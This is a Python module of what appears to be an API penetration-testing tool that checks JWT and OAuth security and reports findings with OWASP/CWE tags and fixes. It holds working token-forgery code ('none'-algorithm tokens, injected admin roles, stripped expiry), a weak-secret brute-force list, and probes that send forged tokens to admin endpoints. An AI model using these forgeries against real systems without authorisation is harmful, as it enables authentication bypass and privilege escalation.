"""
XIPE — JWT / OAuth Security Tester v1.0
Covers the attacks that matter for fintech and enterprise APIs:

1. Algorithm confusion  — RS256 → HS256, RS256 → none
2. None algorithm       — unsigned token accepted
3. Weak secret bruteforce — common secrets list
4. Token expiry bypass  — manipulate exp claim
5. Privilege escalation — change role/sub claims
6. OAuth scope escalation — request admin scopes
7. JWT in non-standard locations — URL params, body fields
"""
import uuid
import json
import base64
import time
import hmac
import hashlib
import re
from typing import List, Dict, Optional
import httpx

from agent.finding import Finding, Severity, OWASPCategory
from utils.logger import PentestLogger


# ── Weak secrets to brute-force ───────────────────────────────────────────────
WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin",
    "changeme", "jwt_secret", "your-256-bit-secret",
    "supersecret", "mysecret", "secret123", "key",
    "privatekey", "jwtkey", "token", "auth",
    "app_secret", "flask-secret", "django-secret",
]

# ── API paths that typically accept JWT-protected requests ────────────────────
AUTH_PROBE_PATHS = [
    "/api/v1/me", "/api/v1/profile", "/api/me", "/api/profile",
    "/api/v1/user", "/api/user", "/api/account",
    "/api/v1/admin", "/api/admin",
    "/api/v1/settings", "/api/settings",
    "/v1/me", "/v1/profile", "/v1/user",
]

# ── OAuth/OIDC endpoints ──────────────────────────────────────────────────────
OAUTH_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/token", "/oauth2/token",
    "/auth/token", "/api/auth/token",
    "/v1/oauth/token",
]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def _parse_jwt(token: str) -> Optional[Dict]:
    """Parse JWT without verification. Returns {header, payload} or None."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "parts": parts}
    except Exception:
        return None


def _forge_none_alg(parsed: Dict) -> str:
    """Forge a token with algorithm=none (no signature)."""
    header  = dict(parsed["header"])
    header["alg"] = "none"
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = parsed["parts"][1]
    return f"{h}.{p}."


def _forge_hs256_with_secret(parsed: Dict, secret: str) -> str:
    """Forge RS256 token re-signed with HS256 using secret."""
    header  = dict(parsed["header"])
    header["alg"] = "HS256"
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = parsed["parts"][1]
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _forge_elevated(parsed: Dict, secret: str = "") -> str:
    """Try to forge a token with elevated role/scope."""
    header  = dict(parsed["header"])
    payload = dict(parsed["payload"])

    # Escalate role
    for field in ("role", "roles", "scope", "groups", "permissions", "is_admin", "admin"):
        if field in payload:
            if isinstance(payload[field], bool):
                payload[field] = True
            elif isinstance(payload[field], str):
                payload[field] = "admin"
            elif isinstance(payload[field], list):
                payload[field] = payload[field] + ["admin"]

    # Remove expiry
    payload.pop("exp", None)

    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    if secret and header.get("alg") in ("HS256", "HS384", "HS512"):
        alg = header["alg"]
        hf  = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
        sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hf).digest()
        return f"{h}.{p}.{_b64url_encode(sig)}"

    return f"{h}.{p}."


def _extract_token_from_response(resp: httpx.Response) -> Optional[str]:
    """Try to extract a JWT from any response."""
    try:
        data = resp.json()
        for field in ("token", "access_token", "accessToken", "jwt", "id_token", "bearer"):
            val = data.get(field, "")
            if isinstance(val, str) and val.count(".") == 2:
                return val
        # Nested
        for v in data.values():
            if isinstance(v, dict):
                for field in ("token", "access_token", "accessToken", "jwt"):
                    val = v.get(field, "")
                    if isinstance(val, str) and val.count(".") == 2:
                        return val
    except Exception:
        pass

    # Authorization header echo
    for h in resp.headers.values():
        if h.count(".") == 2 and len(h) > 20:
            return h

    # Body regex
    m = re.search(r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*', resp.text)
    if m:
        return m.group(0)

    return None


class JWTTester:
    """
    Tests JWT/OAuth security vulnerabilities.
    Works both with a pre-supplied token (from config) and
    by discovering tokens via the login flow.
    """

    def __init__(self, config: dict, logger: PentestLogger,
                 http_client: httpx.Client, brain=None,
                 classification: Dict = None, auth_token: str = None):
        self.config = config
        self.logger = logger
        self.client  = http_client
        self.brain   = brain
        self.classification = classification or {}
        self.base_url = config["scope"]["base_urls"][0].rstrip("/")
        self.findings: List[Finding] = []
        self.token    = auth_token or config["scope"].get("credentials", {}).get("bearer_token", "")
        self._cracked_secret: Optional[str] = None

    # ── Entry ─────────────────────────────────────────────────────────────────

    def run(self) -> List[Finding]:
        self.logger.module_start("JWT / OAuth Security Tester")

        # Step 0: Discover token if not provided
        if not self.token:
            self.token = self._discover_token()

        # Step 1: Audit OAuth/OIDC configuration
        self._audit_oauth_endpoints()

        if not self.token:
            self.logger.info("  No JWT found — skipping token-level tests")
            self.logger.module_done("JWT Tester", len(self.findings))
            return self.findings

        parsed = _parse_jwt(self.token)
        if not parsed:
            self.logger.info("  Token found but could not be parsed")
            self.logger.module_done("JWT Tester", len(self.findings))
            return self.findings

        alg = parsed["header"].get("alg", "unknown")
        self.logger.info(f"  JWT found — alg={alg}")

        # Step 2: None algorithm attack
        self._test_none_algorithm(parsed)

        # Step 3: Weak secret brute force
        self._test_weak_secret(parsed)

        # Step 4: Algorithm confusion RS256 → HS256
        if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
            self._test_algorithm_confusion(parsed)

        # Step 5: Privilege escalation
        self._test_privilege_escalation(parsed)

        # Step 6: Token expiry bypass
        self._test_expiry_bypass(parsed)

        # Step 7: JWT in non-standard locations
        self._test_nonstandard_locations(parsed)

        self.logger.module_done("JWT Tester", len(self.findings))
        return self.findings

    # ── Step 0: Discover token ────────────────────────────────────────────────

    def _discover_token(self) -> Optional[str]:
        creds = self.config["scope"].get("credentials", {})
        email = creds.get("user_email", "")
        password = creds.get("user_password", "")

        if not (email and password):
            return None

        login_paths = [
            "/api/auth/login", "/api/v1/auth/login",
            "/auth/login", "/login", "/api/login",
            "/api/v1/login", "/v1/auth/login",
        ]

        for path in login_paths:
            for payload in [
                {"email": email, "password": password},
                {"username": email, "password": password},
                {"user": email, "pass": password},
            ]:
                try:
                    resp = self.client.post(
                        self.base_url + path,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=8,
                    )
                    if resp.status_code in (200, 201):
                        token = _extract_token_from_response(resp)
                        if token:
                            self.logger.info(f"  Token acquired via {path}")
                            return token
                except Exception:
                    pass

        return None

    # ── Step 1: OAuth Audit ───────────────────────────────────────────────────

    def _audit_oauth_endpoints(self):
        for path in OAUTH_PATHS:
            try:
                resp = self.client.get(self.base_url + path, timeout=6)
                if resp.status_code != 200:
                    continue
                ct = resp.headers.get("content-type", "")
                if "html" in ct:
                    continue

                data = {}
                try:
                    data = resp.json()
                except Exception:
                    pass

                # Exposed OAuth config
                self._add(
                    title=f"OAuth/OIDC Configuration Publicly Exposed: {path}",
                    severity=Severity.MEDIUM,
                    category=OWASPCategory.DATA_EXPOSURE,
                    description=(
                        f"OAuth/OIDC discovery endpoint at {path} is publicly accessible. "
                        f"This reveals authorization endpoints, token endpoints, supported algorithms, "
                        f"and scopes — useful intelligence for crafting targeted token attacks."
                    ),
                    endpoint=self.base_url + path,
                    evidence=resp.text[:400],
                    recommendation="Restrict discovery endpoints to authenticated clients or internal networks.",
                    owasp_api_top10="API2",
                    false_positive_risk="LOW",
                    tags=["oauth", "oidc", "information-disclosure"],
                )

                # Check for dangerous algorithms
                algs = data.get("id_token_signing_alg_values_supported", [])
                if "none" in algs or "HS256" in algs:
                    self._add(
                        title="OAuth Server Supports Weak JWT Algorithms",
                        severity=Severity.HIGH,
                        category=OWASPCategory.AUTH_BYPASS,
                        description=(
                            f"The OAuth server at {path} advertises support for weak or dangerous "
                            f"JWT signing algorithms: {algs}. 'none' allows unsigned tokens. "
                            f"'HS256' with a weak secret is trivially brute-forced."
                        ),
                        endpoint=self.base_url + path,
                        evidence=f"id_token_signing_alg_values_supported: {algs}",
                        recommendation="Remove 'none' and weak symmetric algorithms. Use RS256 or ES256 only.",
                        owasp_api_top10="API2",
                        false_positive_risk="LOW",
                        tags=["oauth", "jwt", "weak-algorithm"],
                    )

            except Exception:
                pass

    # ── Step 2: None algorithm ────────────────────────────────────────────────

    def _test_none_algorithm(self, parsed: Dict):
        forged = _forge_none_alg(parsed)
        accepted = self._probe_token(forged)
        if accepted:
            self._add(
                title="JWT 'none' Algorithm Accepted — Authentication Bypass",
                severity=Severity.CRITICAL,
                category=OWASPCategory.AUTH_BYPASS,
                description=(
                    "The server accepts JWTs with algorithm set to 'none', meaning tokens with "
                    "NO cryptographic signature are treated as valid. An attacker can forge any "
                    "identity, role, or permission claim without knowing any secret key. "
                    "This is a complete authentication bypass."
                ),
                endpoint=self._get_probe_endpoint(),
                evidence=f"Forged token accepted:\n{forged[:120]}...",
                recommendation=(
                    "Reject tokens with alg=none at the JWT validation layer. "
                    "Enforce an algorithm allowlist — never derive the algorithm from the token header."
                ),
                owasp_top10="A07",
                cwe="CWE-347",
                false_positive_risk="LOW",
                tags=["jwt", "none-alg", "auth-bypass", "critical"],
            )
            self.logger.warning("🚨 JWT none algorithm ACCEPTED")

    # ── Step 3: Weak secret brute force ──────────────────────────────────────

    def _test_weak_secret(self, parsed: Dict):
        alg = parsed["header"].get("alg", "")
        if alg not in ("HS256", "HS384", "HS512"):
            return

        hf_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hf = hf_map.get(alg, hashlib.sha256)

        h, p, sig = parsed["parts"]
        signing_input = f"{h}.{p}".encode()

        for secret in WEAK_SECRETS:
            expected_sig = hmac.new(secret.encode(), signing_input, hf).digest()
            expected_b64 = _b64url_encode(expected_sig)
            if expected_b64 == sig:
                self._cracked_secret = secret
                self._add(
                    title=f"JWT Signed with Weak Secret: '{secret}'",
                    severity=Severity.CRITICAL,
                    category=OWASPCategory.AUTH_BYPASS,
                    description=(
                        f"The JWT signature was verified using the common secret '{secret}'. "
                        f"Anyone who knows this secret can forge tokens for any user, role, or "
                        f"permission. Full authentication and authorization bypass."
                    ),
                    endpoint=self.base_url,
                    evidence=f"Algorithm: {alg}\nSecret: {secret}\nToken verified successfully.",
                    recommendation=(
                        "Replace JWT secret with a cryptographically random value of at least 256 bits. "
                        "Rotate all existing tokens immediately."
                    ),
                    owasp_top10="A07",
                    cwe="CWE-521",
                    false_positive_risk="LOW",
                    tags=["jwt", "weak-secret", "brute-force", "critical"],
                )
                self.logger.warning(f"🚨 JWT secret cracked: '{secret}'")
                return

    # ── Step 4: Algorithm confusion ───────────────────────────────────────────

    def _test_algorithm_confusion(self, parsed: Dict):
        """RS256 → HS256 using server's public key as the HMAC secret."""
        pub_key_paths = [
            "/.well-known/jwks.json", "/jwks.json",
            "/api/auth/keys", "/oauth/keys",
            "/.well-known/openid-configuration",
        ]

        pub_key_material = None
        for path in pub_key_paths:
            try:
                resp = self.client.get(self.base_url + path, timeout=6)
                if resp.status_code == 200 and "keys" in resp.text.lower():
                    pub_key_material = resp.text[:500]
                    break
            except Exception:
                pass

        if not pub_key_material:
            return

        self._add(
            title="JWKS Public Key Endpoint Exposed — Algorithm Confusion Risk",
            severity=Severity.HIGH,
            category=OWASPCategory.AUTH_BYPASS,
            description=(
                "The server exposes its public key(s) via a JWKS endpoint. "
                "If the server does not enforce the expected algorithm (RS256), an attacker can "
                "download the public key, use it as an HMAC secret, and re-sign tokens with HS256. "
                "This is the classic algorithm confusion / CVE-2016-10555 attack pattern."
            ),
            endpoint=self.base_url + path,
            evidence=f"JWKS endpoint accessible:\n{pub_key_material[:300]}",
            recommendation=(
                "Explicitly enforce RS256 (or ES256) in JWT validation. "
                "Never derive the expected algorithm from the token header. "
                "Use a strict allowlist of permitted algorithms."
            ),
            owasp_top10="A07",
            cwe="CWE-347",
            false_positive_risk="LOW",
            tags=["jwt", "algorithm-confusion", "jwks", "rs256-hs256"],
        )

    # ── Step 5: Privilege escalation ─────────────────────────────────────────

    def _test_privilege_escalation(self, parsed: Dict):
        payload = parsed["payload"]
        has_role = any(k in payload for k in ("role", "roles", "scope", "groups", "is_admin", "admin"))
        if not has_role:
            return

        forged = _forge_elevated(parsed, self._cracked_secret or "")
        accepted = self._probe_token(forged, admin_endpoint=True)
        if accepted:
            self._add(
                title="JWT Privilege Escalation — Role/Scope Manipulation Accepted",
                severity=Severity.CRITICAL,
                category=OWASPCategory.BROKEN_ACCESS,
                description=(
                    "The server accepted a forged JWT with an elevated role/admin claim. "
                    "An attacker can modify the token payload (role, scope, is_admin) to gain "
                    "administrative access without valid credentials."
                ),
                endpoint=self._get_probe_endpoint(admin=True),
                evidence=f"Forged token with admin role accepted:\n{forged[:120]}...",
                recommendation=(
                    "Never trust claims in the JWT payload for authorization decisions without "
                    "re-validating against a server-side source of truth (DB/session store). "
                    "Ensure JWT signature is always verified before reading any claim."
                ),
                owasp_top10="A01",
                cwe="CWE-285",
                false_positive_risk="LOW",
                tags=["jwt", "privilege-escalation", "role-manipulation", "critical"],
            )

    # ── Step 6: Expiry bypass ─────────────────────────────────────────────────

    def _test_expiry_bypass(self, parsed: Dict):
        payload = dict(parsed["payload"])
        if "exp" not in payload:
            self._add(
                title="JWT Has No Expiry (exp) Claim",
                severity=Severity.MEDIUM,
                category=OWASPCategory.AUTH_BYPASS,
                description=(
                    "The JWT does not contain an 'exp' (expiration) claim. "
                    "Tokens without expiry remain valid forever — a stolen token can be replayed indefinitely."
                ),
                endpoint=self.base_url,
                evidence=f"JWT payload: {json.dumps(payload)[:300]}",
                recommendation="Set a short token lifetime (15-60 min) and enforce exp validation server-side.",
                owasp_top10="A07",
                cwe="CWE-613",
                false_positive_risk="LOW",
                tags=["jwt", "no-expiry", "token-lifetime"],
            )
            return

        # Try expired token (set exp to past)
        payload["exp"] = int(time.time()) - 3600  # 1 hour ago
        h = parsed["parts"][0]
        p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        expired_token = f"{h}.{p}.{parsed['parts'][2]}"
        if self._probe_token(expired_token):
            self._add(
                title="JWT Expiry Not Validated — Expired Tokens Accepted",
                severity=Severity.HIGH,
                category=OWASPCategory.AUTH_BYPASS,
                description=(
                    "The server accepts JWTs with an expired 'exp' claim. "
                    "Stolen or leaked tokens remain valid indefinitely, enabling persistent unauthorized access."
                ),
                endpoint=self._get_probe_endpoint(),
                evidence="Token with exp set to 1 hour in the past was accepted as valid.",
                recommendation="Enforce strict expiry validation on every request. Implement token revocation.",
                owasp_top10="A07",
                cwe="CWE-613",
                false_positive_risk="LOW",
                tags=["jwt", "expiry-bypass", "session-management"],
            )

    # ── Step 7: Non-standard locations ───────────────────────────────────────

    def _test_nonstandard_locations(self, parsed: Dict):
        """Some APIs accept JWT in query params or body — easier to steal from logs."""
        token = self.token
        for path in AUTH_PROBE_PATHS[:5]:
            url = self.base_url + path
            # Try JWT in query param
            for param in ("token", "access_token", "jwt", "auth"):
                try:
                    resp = self.client.get(f"{url}?{param}={token}", timeout=6)
                    if resp.status_code == 200:
                        ct = resp.headers.get("content-type", "")
                        if "html" not in ct:
                            self._add(
                                title=f"JWT Accepted in URL Query Parameter: ?{param}=",
                                severity=Severity.MEDIUM,
                                category=OWASPCategory.DATA_EXPOSURE,
                                description=(
                                    f"The endpoint {path} accepts JWT authentication via the URL "
                                    f"query parameter '?{param}='. Tokens in URLs are logged by "
                                    f"proxies, CDNs, and browser history — significantly increasing "
                                    f"the attack surface for token theft."
                                ),
                                endpoint=url,
                                recommendation="Accept JWT only in Authorization header. Never in URL params.",
                                owasp_top10="A07",
                                false_positive_risk="MEDIUM",
                                tags=["jwt", "url-param", "token-exposure"],
                            )
                            return
                except Exception:
                    pass

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _get_probe_endpoint(self, admin: bool = False) -> str:
        if admin:
            return self.base_url + "/api/v1/admin"
        return self.base_url + "/api/v1/me"

    def _probe_token(self, token: str, admin_endpoint: bool = False) -> bool:
        """Send token to probe endpoints and check if accepted."""
        endpoints = ["/api/v1/admin", "/api/admin"] if admin_endpoint else AUTH_PROBE_PATHS[:6]
        for path in endpoints:
            try:
                resp = self.client.get(
                    self.base_url + path,
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=6,
                )
                if resp.status_code == 200:
                    ct = resp.headers.get("content-type", "")
                    if "html" not in ct:
                        return True
            except Exception:
                pass
        return False

    def _add(self, owasp_top10=None, owasp_api_top10=None, cwe=None,
             tags=None, false_positive_risk="MEDIUM", **kwargs) -> Finding:
        f = Finding(
            id=f"JWT-{str(uuid.uuid4())[:8].upper()}",
            module="jwt_tester",
            false_positive_risk=false_positive_risk,
            owasp_top10=owasp_top10,
            owasp_api_top10=owasp_api_top10,
            cwe=cwe,
            tags=tags or [],
            **kwargs,
        )
        self.findings.append(f)
        if f.severity.value in ("CRITICAL", "HIGH"):
            self.logger.finding(f.severity.value, f.title)
        return f
